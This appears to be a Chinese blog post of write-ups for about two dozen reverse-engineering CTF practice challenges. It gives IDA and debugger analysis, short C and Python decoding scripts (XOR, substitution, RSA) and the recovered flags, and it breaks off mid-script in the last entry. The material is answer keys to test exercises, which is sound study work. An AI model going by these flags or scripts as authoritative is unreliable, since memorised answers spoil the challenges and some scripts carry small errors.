        <content type="html"><![CDATA[<h1 id="Challenge-area"><a href="#Challenge-area" class="headerlink" title="Challenge area"></a>Challenge area</h1><h2 id="1-elrond32"><a href="#1-elrond32" class="headerlink" title="1.elrond32"></a>1.elrond32</h2><p>文件下载下来，放到ida里面看，找到关键代码。</p><p>大致分析，先求key，再找v2，再异或。<br><img src="https://i.loli.net/2021/01/19/ZYt4zRE8esUpKWL.png"><br>写出脚本</p><pre><code>#include&lt;stdio.h&gt; int main(void)&#123;    int key[9]=&#123;105,115,101,110,103,97,114,100&#125;;    int v2[33]=&#123; 0xf,0x1f,0x4,0x9,0x1c,0x12,0x42,0x9,0xc,0x44,    0xd,0x7,0x9,0x6,0x2d,0x37,0x59,0x1e,0,0x59,0xf,0x8    ,0x1c,0x23,0x36,0x7,0x55,0x2,0xc,0x8,0x41,0xa,0x14,&#125;;   int i;   for(i=0;i&lt;33;i++)    &#123;        printf(&quot;%c&quot;,key[i%8]^v2[i]);    &#125;&#125;</code></pre><p>得到flag{s0me7hing_S0me7hinG_t0lki3n}</p><h2 id="2-666"><a href="#2-666" class="headerlink" title="2.666"></a>2.666</h2><p>ELF文件，ida打开，找到关键代码，分析<br><img src="https://i.loli.net/2021/01/19/diLJQsBIp8V7zOc.png"><br>写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int s[19]=&#123;&#39;i&#39;, &#39;z&#39;, &#39;w&#39;, &#39;h&#39;, &#39;r&#39;, &#39;o&#39;, &#39;z&#39;, &#39;&quot;&#39;, &#39;&quot;&#39;, &#39;w&#39;, &#39;&quot;&#39;, &#39;v&#39;, &#39;.&#39;, &#39;K&#39;, &#39;&quot;&#39;, &#39;.&#39;, &#39;N&#39;, &#39;i&#39;&#125;;    int flag[19];    int i;    for(i=0;i&lt;18;i+=3)    &#123;        flag[i]=(s[i]^18)-6;        flag[i+1]=(s[i+1]^18)+6;        flag[i+2]=s[i+2]^6^18;     &#125;    for(i=0;i&lt;18;i++)    printf(&quot;%c&quot;,flag[i]); &#125;</code></pre><h2 id="3-Reversing-x64Elf-100"><a href="#3-Reversing-x64Elf-100" class="headerlink" title="3.Reversing-x64Elf-100"></a>3.Reversing-x64Elf-100</h2><p>ELF文件，ida打开，找到关键代码，分析<br><img src="https://i.loli.net/2021/01/19/CS9WPR5L1UTJc2q.png"><br>比较有意思的是以前还没做到过用字符串组这种的加密，脚本如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char v3[3][8] = &#123;&quot;Dufhbmf&quot;,&quot;pG`imos&quot;,&quot;ewUglpt&quot;&#125;;    int i;    int flag[13];    for(i=0;i&lt;=11;i++)    &#123;        flag[i]=*(v3[i%3]+2*(i/3))-1;        printf(&quot;%c&quot;,flag[i]);    &#125;&#125; </code></pre><p>得到Code_Talkers</p><h2 id="4-IgniteMe"><a href="#4-IgniteMe" class="headerlink" title="4.IgniteMe"></a>4.IgniteMe</h2><p>exe文件，ida打开，找到关键代码，分析<br><img src="https://i.loli.net/2021/01/19/EXiTzfWhsl1w8xY.png"><br>写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char code[]=&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;;    int flag[24]=&#123;0&#125;;    int i;    int key[40]=&#123;13,  19,  23,  17,   2,   1,  32,  29,  12,   2,    25,  47,  23,  43,  36,  31,  30,  22,   9,  15,    21,  39,  19,  38,  10,  47,  30,  26,  45,  12,    34,  4&#125;;   for(i=0;i&lt;24;i++)   &#123;       flag[i]=((code[i]^key[i])-72)^0x55;       printf(&quot;%c&quot;,flag[i]);   &#125; &#125; </code></pre><p>套上格式，得到EIS{WADX_TDGK_AIHC_IHKN_PJLM}</p><h2 id="5-debug"><a href="#5-debug" class="headerlink" title="5.debug"></a>5.debug</h2><p>IDA不能打开，用Eexinfo PE打开，发现是.net，并且还混淆了的。<br><img src="https://i.loli.net/2021/01/19/2TxQ3mrNIkJaPtK.png"><br>先去混淆，类似去混淆还有buuctf的一道[V&amp;N2020 公开赛]CSRe 1。</p><p>先将文件和de4tor.exe放在同一个文件夹，这里是放在的de4tor，顺便把文件名改了，在cmd里面执行。<br><img src="https://i.loli.net/2021/01/19/JMCoTm7b43zkRXp.png"><br>然后用<br>dnspy32位打开，直接进入入口点。<br><img src="https://i.loli.net/2021/01/19/WczLTgBtVlUqwdx.png"><br>到了main函数。<br><img src="https://sm.ms/image/JiQ6N1BEdrKFcgv"><br>得到lag{967DDDFBCD32C1F53527C221D9E40A0B}</p><h2 id="6-hackme"><a href="#6-hackme" class="headerlink" title="6.hackme"></a>6.hackme</h2><p>ida打开找到关键代码。<br><img src="https://i.loli.net/2021/01/19/CGNrk8MjLpVE139.png"><br>写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int flag[23];    int code[23]=&#123; 95, 242,  94, 139,  78,  14, 163, 170, 199, 147,   129,  61,  95, 116, 163,   9, 145,  43,  73,  40,   147, 103&#125;;      int i,j,num=0,men;      for(i=0;i&lt;22;i++)      &#123;          j=i+1;          men=0;          num=0;          while(men&lt;j)          &#123;              men++;              num=1828812941 * num + 12345;        &#125;          flag[i]=code[i]^num;          printf(&quot;%c&quot;,flag[i]);      &#125; &#125; </code></pre><h2 id="7-Guess-the-Number"><a href="#7-Guess-the-Number" class="headerlink" title="7.Guess-the-Number"></a>7.Guess-the-Number</h2><p>java逆向，直接拖到jd-gui。<br><img src="https://i.loli.net/2021/01/19/PhWGLBVzC17EHjb.png"><br>大数异或，上python，脚本如下</p><pre><code>a=0x4b64ca12ace755516c178f72d05d7061b=0xecd44646cfe5994ebeb35bf922e25dbaflag=hex(a^b)print(flag)</code></pre><h2 id="8-BABYRE"><a href="#8-BABYRE" class="headerlink" title="8.BABYRE"></a>8.BABYRE</h2><h2 id="9-EasyRE"><a href="#9-EasyRE" class="headerlink" title="9.EasyRE"></a>9.EasyRE</h2><p>这道题非常有意思，其f5出来的伪代码有点问题，开始看了好久还没看明白，后来一边写脚本，发现了问题。<br><img src="https://i.loli.net/2021/01/19/8fSEy3QVhjzPXZK.png"><br>然后这里去dbg里面看看字符串倒序怎么一回事。<br><img src="https://i.loli.net/2021/01/19/3MSRf9ytOng2Kro.png"><br>然后开始写脚本</p><pre><code>#include&lt;stdio.h&gt;void down(int *a,int len_flag)&#123;    int i,t;     int len=len_flag;    for(i = 0; i &lt; len/2; i++)    &#123;        t = a[i];        a[i] = a[len-i-1];        a[len-i-1] = t;    &#125;&#125;int main(void)&#123;    int code[25]=&#123;&#39;x&#39;, &#39;I&#39;, &#39;r&#39;, &#39;C&#39;, &#39;j&#39;, &#39;~&#39;, &#39;&lt;&#39;, &#39;r&#39;, &#39;|&#39;, &#39;2&#39;, &#39;t&#39;, &#39;W&#39;, &#39;s&#39;, &#39;v&#39;, &#39;3&#39;, &#39;P&#39;, &#39;t&#39;, &#39;I&#39;,0x7f,0x7a,0x6e,0x64,0x6b,0x61&#125;;    int flag[25];    int i;    for(i=0;i&lt;24;i++)    &#123;        flag[i]=(code[i]^6)-1;    &#125;    down(flag,25);    for(i=0;i&lt;25;i++)    &#123;        printf(&quot;%c&quot;,flag[i]);    &#125; &#125; </code></pre><p>得到flag{xNqU4otPq3ys9wkDsN}</p><h2 id="10-Shuffle"><a href="#10-Shuffle" class="headerlink" title="10.Shuffle"></a>10.Shuffle</h2><p>ida打开直接就看到flag了，SECCON{Welcome to the SECCON 2014 CTF!}</p><h2 id="11-re-for-50-plz-50"><a href="#11-re-for-50-plz-50" class="headerlink" title="11.re-for-50-plz-50"></a>11.re-for-50-plz-50</h2><p>文件下载下来，Eexinfo PE打开，发现是mpis，而且ida无法f5，只好看汇编。</p><p><img src="https://i.loli.net/2021/01/20/5FW3tXHYOd1C7N4.png"></p><p>关键地方<br><img src="https://i.loli.net/2021/01/20/MrSPCaKtJ3wFDdE.png"><br>写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    char flag[]=&quot;cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ&quot;;    int i;    for(i=0;i&lt;31;i++)    &#123;        printf(&quot;%c&quot;,flag[i]^0x37);    &#125; &#125; </code></pre><p>得到TUCTF{but_really_whoisjohngalt}</p><h2 id="12-dmd-50"><a href="#12-dmd-50" class="headerlink" title="12.dmd-50"></a>12.dmd-50</h2><p>ida打开，看到关键代码，然后发现是MD5加密<br><img src="https://i.loli.net/2021/01/20/WE5FwfQJCkGODLV.png"><br>直接在线解密<br><img src="https://i.loli.net/2021/01/20/JPowqbEFVWmdgLf.png"></p><h2 id="13-secret-galaxy-300"><a href="#13-secret-galaxy-300" class="headerlink" title="13.secret-galaxy-300"></a>13.secret-galaxy-300</h2><p>ida打开，看了半天也没分析出来是什么，没有input，也没有输出，就是有些关于行星呀什么之类的。然后看别人的wp，用了od动调。<br><img src="https://i.loli.net/2021/01/20/RlWHLrEZOp8xt5f.png"><br>然后在ida里面的赋值好像在这里<br><img src="https://i.loli.net/2021/01/20/zr4tDogVXGA9jZO.png"><br>然后得到flag：aliens_are_around_us</p><h2 id="14-srm-50"><a href="#14-srm-50" class="headerlink" title="14.srm-50"></a>14.srm-50</h2><p>文件直接打开，要你输入email和password，然后直接放到ida里面看，找到关键函数<br><img src="https://i.loli.net/2021/01/20/JuKlyG4Qif13chS.png"><br>得到flag：CZ9dmq4c8g9G7bAX</p><h2 id="15-simple-check-100"><a href="#15-simple-check-100" class="headerlink" title="15.simple-check-100"></a>15.simple-check-100</h2><p>前言：挺开心的，由于这道题的exe文件用dbg动调，得到的flag竟然是乱码，让我学会了如何用ida动态调试elf文件，这里给个链接如何用ida动态调试elf文件：<a href="https://www.it610.com/article/1298189057175658496.htm">https://www.it610.com/article/1298189057175658496.htm</a>。<br>首先看看ida里面的逻辑<br><img src="https://i.loli.net/2021/01/21/XQuUG8CeYNaf2yH.png"><br>先来说说exe调试过程。<br><img src="https://i.loli.net/2021/01/21/4L9GyeW16NAsfxD.png"><br>再来说一说ida动调elf过程。<br><img src="https://i.loli.net/2021/01/22/rzlNf2V8FQUqxbu.png"><br>然后得到flag<br><img src="https://i.loli.net/2021/01/22/BMm5vgledx1NXkZ.png"></p><h2 id="16-gametime"><a href="#16-gametime" class="headerlink" title="16.gametime"></a>16.gametime</h2><p>感谢这道题锻炼了我dbg的动调能力。</p><p>文件下载下来，是一个游戏，，属于玩通关了就给flag的那一种，先玩一玩，如果你足够厉害应该是可以玩出来的。玩了一下大概游戏规则就是看到s就按’ ‘，遇到x就按’x’，遇到m就按’m’。</p><p>然后放到ida里面看，为了好看一点，改了部分函数名称，分析分为3个部分。</p><p>第一部分，告诉你游戏规则<br><img src="https://i.loli.net/2021/01/21/mnAlhobL6k5MSsy.png"><br>第二部分，熟悉怎么玩。<br><img src="https://i.loli.net/2021/01/21/YU2B38he6aiug9s.png"><br>第三部分，玩10次，对了就给flag<br><img src="https://i.loli.net/2021/01/21/tm4qUIirv3hLVgd.png"></p><p>接下来，x32dbg动调，需要自己慢慢分析整个流程，找到关键函数位置，这里就只放两个关键点的图片。</p><p>条件判断1<br><img src="https://i.loli.net/2021/01/21/bAn6yhB7gmUZPFv.png"><br>条件判断2<br><img src="https://i.loli.net/2021/01/21/m3tLMkeO98TF2oR.png"><br>最后得到flag<br><img src="https://i.loli.net/2021/01/21/l9cOGIgXxomHTrF.png"></p><h2 id="17-tt3441810"><a href="#17-tt3441810" class="headerlink" title="17.tt3441810"></a>17.tt3441810</h2><p>这道题就是很无语的。就是将所有二进制提出来，然后去看。</p><p>脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[300]=&#123; 104, 102, 108, 72, 191,   1,   0,   0,     72, 141,  52,  36,  72,   186,   2,   0,   0,   0,   0,   0,   0,   0,  72,   184,   1,   0,   0,   0,   0,   0,   0,   0,  15,     5, 104,  97, 103,   0,   0,  72, 191,   1,   0,     0,   0,   0,   0,   0,   0,  72, 141,  52,  36,    72, 186,   2,   0,   0,   0,   0,   0,   0,   0,    72, 184,   1,    15,   5, 104, 123, 112,   0,   0,  72, 191,   1,     0,   0,   0,   0,   0,   0,   0,  72, 141,  52,    36,  72, 186,   2,       0,  72, 184,   1,      0,  15,   5, 104, 111, 112,   0,   0,  72, 191,     1,   0,   0,   0,   0,   0,   0,   0,  72, 141,    52,  36,  72, 186,   2,     0,   0,  72, 184,   1,   0,   0,   0,   0,   0,     0,   0,  15,   5, 104, 112, 111,   0,   0,  72,   191,   1,   0,   0,   0,   0,   0,   0,   0,  72,   141,  52,  36,  72, 186,   2,   0,   0,   0,   0,     0,   0,   0,  72, 184,   1,   0,   0,   0,   0,     0,   0,   0,  15,   5, 104, 112, 114,   0,   0,    72, 191,   1,      72, 141,  52,  36,  72, 186,   2,      0,   0,   0,   0,  72, 184,   1,    0,   0,   0,   0,  15,   5, 104, 101, 116,   0,     0,  72, 191,   1,     0,  72, 141,  52,  36,  72, 186,   2,   0,   0,     0,   0,   0,   0,   0,  72, 184,   1,   0,   0,     0,   0,   0,   0,   0,  15,   5, 104, 125,  10,     0,   0,  72, 191,   1,   0,   0,   0,   0,   0,     0,   0,  72, 141,  52,  36,  72, 186,   2,   0,     0,   0,   0,   0,   0,   0, 72, 184, 1, 15, 5,     72, 49, 255, 72, 184, 60,15,5&#125;;    int i;    for(i=0;i&lt;300;i++)    &#123;        if(a[i]!=0&amp;&amp;a[i]&lt;=&#39;z&#39;&amp;&amp;a[i]&gt;=&#39;a&#39;&amp;&amp;a[i]!=&#39;h&#39;)        &#123;            printf(&quot;%c&quot;,a[i]);        &#125;    &#125; &#125; </code></pre><p>将输出内容整理一下，得到flag{poppopret}</p><h2 id="18-notsequence"><a href="#18-notsequence" class="headerlink" title="18.notsequence"></a>18.notsequence</h2><p>怎么说呢，这道题只要你看出是杨辉三角就简单。考了杨辉三角的两个个性质。</p><p>性质一：第n行数字的和为2^（n-1）。1=2^（1-1），1+1=2^（2-1），1+2+1=2^（3-1），1+3+3+1=2^（4-1），1+4+6+4+1=2^（5-1），1+5+10+10+5+1=2^（6-1）<br><img src="https://i.loli.net/2021/01/22/fdQEwi2jO6GR7U8.png"><br>性质二：斜线上数字的和等于其向左（从左上方到右下方的斜线）或向右拐弯（从右上方到左下方的斜线），拐角上的数字。1+1=2，1+1+1=3，1+1+1+1=4，1+2=3，1+2+3=6，1+2+3+4=10，1+3=4，1+3+6=10，1+4=5。<br><img src="https://i.loli.net/2021/01/22/JTINuMcjtyXm3lO.png"><br>脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[200][200];    int i,j,n;    printf(&quot;n为杨辉三角的行数，请输入n：&quot;);    scanf(&quot;%d&quot;,&amp;n);     for(i=0;i&lt;n;i++)    &#123;        a[i][0]=1;        a[i][i]=1;    &#125;    for(i=2;i&lt;n;i++)    &#123;        for(j=1;j&lt;i;j++)        a[i][j]=a[i-1][j-1]+a[i-1][j];     &#125;    for(i=0;i&lt;n;i++)    &#123;        for(j=0;j&lt;=i;j++)        &#123;            printf(&quot;%d&quot;,a[i][j]);        &#125;    &#125;&#125;</code></pre><p><img src="https://i.loli.net/2021/01/22/8Y3eA6qvgWdjKFE.png"><br>得到RCTF{37894beff1c632010dd6d524aa9604db}</p><h2 id="19-re2-cpp-is-awesome"><a href="#19-re2-cpp-is-awesome" class="headerlink" title="19.re2-cpp-is-awesome"></a>19.re2-cpp-is-awesome</h2><p>简单的cpp代码分析。<br><img src="https://i.loli.net/2021/01/22/ipzvHrG4OInyfXF.png"><br>直接写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int key[33]=&#123;0x24,0x00,0x05,0x36,0x65,0x07,0x27,0x26,0x2D,    0x01, 0x03,0x00,0x0D,0x56,0x01, 0x03,0x65,0x03,0x2D,0x16,   0x02,0x15,0x03,0x65, 0x00,0x29,0x44,0x44,0x01,0x44, 0x2B&#125;;    char table[120]=&quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;;    int flag[30];    int i;    for(i=0;i&lt;31;i++)    &#123;        flag[i]=table[key[i]];        printf(&quot;%c&quot;,flag[i]);    &#125; &#125; </code></pre><h2 id="20-easy-Maze"><a href="#20-easy-Maze" class="headerlink" title="20.easy_Maze"></a>20.easy_Maze</h2><p>迷宫题，然后IDA打开先分析一下逻辑。<br><img src="https://i.loli.net/2021/01/24/dM32sclnQeS8iyV.png"><br>然后根据动态调试来获取变换后的迷宫。<br><img src="https://i.loli.net/2021/01/24/xwFJPEredgonki7.png"><br>然后就可以写迷宫了<br><img src="https://i.loli.net/2021/01/24/y6pUERKZsbrz7P4.png"></p><h2 id="21-Replace"><a href="#21-Replace" class="headerlink" title="21.Replace"></a>21.Replace</h2><p>这道题让我又见识了一种奇数偶数加密的方式。</p><p>首先upx脱壳，然后放入ida里面<br><img src="https://i.loli.net/2021/01/26/lf1wNOAcjtMuRWD.png"></p><p>写脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[257]=&#123;0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,   0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,   0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,   0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,   0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,   0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,   0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,   0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,   0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,   0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,   0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,   0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,   0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,   0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,   0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,   0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,   0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,   0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,   0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,   0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,   0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,   0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,   0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,   0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,   0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,   0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16  &#125;;  char b[71]=&quot;2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6&quot;;  int flag[36];  int mid[36];  int i,j;  for(i=0;i&lt;70;i++)  &#123;      if(b[i]&lt; 48 || b[i] &gt; 57)          b[i] = b[i] - 87;      else          b[i] = b[i] - 48;  &#125;  for(i=0;i&lt;70;i++)  &#123;      printf(&quot;%d &quot;,b[i]);  &#125;  printf(&quot;\n&quot;);  for(i=0,j=0;i&lt;70;i+=2,j++)  &#123;       mid[j]=((b[i]&lt;&lt;4)+b[i+1])^0x19;  &#125;  for(i=0;i&lt;=38;i++)  &#123;      printf(&quot;%d &quot;,mid[i]);  &#125;  for(i=0;i&lt;35;i++)  &#123;      for(j=0;j&lt;256;j++)      &#123;          if(mid[i]==a[j])          &#123;              flag[i]=j;        &#125;    &#125;  &#125;  printf(&quot;\n&quot;);  for(i=0;i&lt;35;i++)  &#123;      printf(&quot;%c&quot;,flag[i]);  &#125;&#125;</code></pre><p>得到flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</p><h2 id="22-SignIn"><a href="#22-SignIn" class="headerlink" title="22.SignIn"></a>22.SignIn</h2><p>文件下载下来直接用ida打开，一套操作找到关键代码</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char v4; // [rsp+0h] [rbp-4A0h]  char v5; // [rsp+10h] [rbp-490h]  char v6; // [rsp+20h] [rbp-480h]  char v7; // [rsp+30h] [rbp-470h]  char v8; // [rsp+40h] [rbp-460h]  char v9; // [rsp+B0h] [rbp-3F0h]  unsigned __int64 v10; // [rsp+498h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts(&quot;[sign in]&quot;);  printf(&quot;[input your flag]: &quot;, a2);  __isoc99_scanf(&quot;%99s&quot;, &amp;v8);  sub_96A(&amp;v8, &amp;v9);  __gmpz_init_set_str(&amp;v7, &quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);  __gmpz_init_set_str(&amp;v6, &amp;v9, 16LL);  __gmpz_init_set_str(&amp;v4, &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;, 10LL);  __gmpz_init_set_str(&amp;v5, &quot;65537&quot;, 10LL);  __gmpz_powm(&amp;v6, &amp;v6, &amp;v5, &amp;v4);  if ( (unsigned int)__gmpz_cmp(&amp;v6, &amp;v7) )    puts(&quot;GG!&quot;);  else    puts(&quot;TTTTTTTTTTql!&quot;);  return 0LL;&#125;</code></pre><p>发现是一个rsa加密， __gmpz_init_set_str 函数是GNU 高精度算法库。</p><pre><code>c=0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35//密文n=103461035900816914121390101299049044413950405173712170434161686539878160984549e=65537</code></pre><p>先得到q，p。</p><pre><code>q=282164587459512124844245113950593348271p=366669102002966856876605669837014229419</code></pre><p>用脚本跑出来</p><pre><code>from Crypto.Util.number import *import gmpy2p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419e = 65537c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35n = q*pphi = (q-1)*(p-1)d = gmpy2.invert(e,phi)m = gmpy2.powmod(c,d,n)flag = long_to_bytes(m)print(flag)</code></pre><p>得到suctf{Pwn_@_hundred_years}</p><h2 id="23-EASYHOOK"><a href="#23-EASYHOOK" class="headerlink" title="23.EASYHOOK##"></a>23.EASYHOOK##</h2><p>通过这道题学会了可以使用动调来找到加密函数的位置。</p><p>ida看到主函数后，发现里面根本不好找到加密函数，还有一个假的加密函数，然后通过动调来来找到加密函数，如下。<br><img src="https://i.loli.net/2021/01/25/kr7Lqj4x8Z9eVwd.png"><br>ida相应位置<br><img src="https://i.loli.net/2021/01/25/kOnVsL25qSYzmrf.png"><br>写出相应脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int code[20]=&#123;0x61, 0x6A, 0x79, 0x67, 0x6B, 0x46, 0x6D, 0x2E, 0x7F, 0x5F,   0x7E, 0x2D, 0x53, 0x56, 0x7B, 0x38, 0x6D, 0x4C, 0x6E&#125;;      int i,j;      int flag[20];      flag[18]=code[18]^0x13;      for(i=0;i&lt;18;i++)      &#123;          if(i%2)          &#123;              flag[i]=(code[i]^i)+i;        &#125;        else        &#123;            flag[i+2]=code[i]^i;        &#125;    &#125;    for(i=0;i&lt;19;i++)    &#123;        printf(&quot;%c&quot;,flag[i]);    &#125; &#125; </code></pre><p>得到的东西前面加一个f，得到flag{Ho0k_w1th_Fun}</p><h2 id="24-babymips"><a href="#24-babymips" class="headerlink" title="24.babymips"></a>24.babymips</h2><p>如果你有可以反汇编mips架构的ida，这道题就很简单。<br><img src="https://i.loli.net/2021/01/26/YG3lQk8rKisNBRd.png"><br>开始写脚本</p><pre><code>#include&lt;stdio.h&gt; int main(void)&#123;    int code[33]=&#123;  0x51, 0x7C, 0x6A, 0x7B, 0x67, 0x52, 0xFD,   0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80, 0x13, 0x41, 0x54, 0xA0,   0x8D, 0x45, 0x18, 0x81, 0xDE, 0xFC, 0x95, 0xF0, 0x16, 0x79,   0x1A, 0x15, 0x5B, 0x75, 0x1F&#125;;  int flag[33];  int i;  for(i=5;i&lt;32;i++)  &#123;      if(i%2)//奇           code[i]=code[i]&lt;&lt;2|code[i]&gt;&gt;6;    else//偶         code[i]=code[i]&lt;&lt;6|code[i]&gt;&gt;2;            &#125;  for(i=0;i&lt;32;i++)  &#123;      flag[i]=code[i]^(32-i);      printf(&quot;%c&quot;,flag[i]);  &#125;&#125;</code></pre><h2 id="25-reverse-for-the-holy-grail-350"><a href="#25-reverse-for-the-holy-grail-350" class="headerlink" title="25.reverse-for-the-holy-grail-350"></a>25.reverse-for-the-holy-grail-350</h2><p>不得不说这道题是真的有点坑。考验静态分析能力，还有一个爆破考点。</p><p>真正的比较在stringMod函数中。<br><img src="https://i.loli.net/2021/01/26/UMPTi4GAyLY8upm.png"><br>脚本如下</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int flag[19];//65, 105, 110, 69,111,97    flag[0]=65;    flag[3]=105;    flag[6]=110;    flag[9]=69;    flag[12]=111;    flag[15]=97;    int v8[19]=&#123;666,667 ,669 ,673 ,676 ,677 ,679 ,683 ,686 ,687 ,689 ,693 ,696 ,697 ,699 ,703 ,706 ,707 ,709&#125;;    int marry[7]=&#123;471, 12, 580, 606, 147, 108&#125;;    int i=0,j,c=0,v7=666;    for(i=0;i&lt;18;i++)    &#123;        flag[i]=flag[i]^v7;        v7=v7+v7%5;    &#125;    flag[2]=239+256*2;    flag[5]=196+256*2;    flag[8]=220+256*2;    flag[11]=199+256*2;    flag[14]=222+256*2;    flag[17]=252+256*2;    for(i=0;i&lt;18;i++)    &#123;        printf(&quot;%d &quot;,flag[i]);    &#125;    printf(&quot;\n&quot;);    for(i=0,c=0;i&lt;18;i+=3,c++)    &#123;        for(j=35;j&lt;123;j++)        &#123;            if(flag[i]*(j^v8[i+1])%flag[i+2]==marry[c])            &#123;                flag[i+1]=j^v8[i+1];                break;            &#125;        &#125;    &#125;    for(i=0;i&lt;18;i++)    &#123;        flag[i]=flag[i]^v8[i];        printf(&quot;%c&quot;,flag[i]);    &#125;&#125;</code></pre><p>套上格式得到tuctf{AfricanOrEuropean?}</p><h2 id="26-re4-unvm-me"><a href="#26-re4-unvm-me" class="headerlink" title="26.re4-unvm-me"></a>26.re4-unvm-me</h2><p>pyc文件，然后就用uncompyle6反编译一下，由于其他文章之前有过这样的题，就不写怎么反编译了。<br><img src="https://i.loli.net/2021/01/26/Z3mwbPNUWDF6lRi.png"><br>然后解密可以直接线上解，或者用脚本解，脚本比较慢</p><p>好兄弟写的脚本如下</p><pre><code>list = [174282896860968005525213562254350376167, 137092044126081477479435678296496849608, 126300127609096051658061491018211963916, 314989972419727999226545215739316729360, 256525866025901597224592941642385934114, 115141138810151571209618282728408211053, 8705973470942652577929336993839061582, 256697681645515528548061291580728800189, 39818552652170274340851144295913091599, 65313561977812018046200997898904313350, 230909080238053318105407334248228870753, 196125799557195268866757688147870815374, 74874145132345503095307276614727915885]list = [8705973470942652577929336993839061582]for k in list:     m = hex(k)[2:]     print(m,end=&#39;,&#39;)import hashlibdic = [&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;G&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;]list1 = 